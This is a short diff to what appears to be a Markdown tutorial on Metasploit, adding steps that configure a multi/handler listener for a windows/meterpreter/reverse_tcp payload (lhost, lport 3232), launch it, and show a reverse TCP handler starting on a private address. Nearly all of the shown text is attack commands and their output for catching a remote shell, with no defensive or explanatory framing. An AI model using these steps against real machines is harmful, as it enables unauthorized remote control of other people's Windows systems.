@@ -56,4 +56,17 @@ output:
 ```output
 payload => windows/meterpreter/reverse_tcp
 ```
-
+```terminal
+msf6 exploit(multi/handler) > set lhost adress_ip
+```
+```terminal
+msf6 exploit(multi/handler) > set lport 3232
+```
+`now we launch exploit`
+```terminal
+msf6 exploit(multi/handler) > exploit
+```
+```terminal
+[*] Started reverse TCP handler on 172.20.10.4:3232 
+```
+thanks
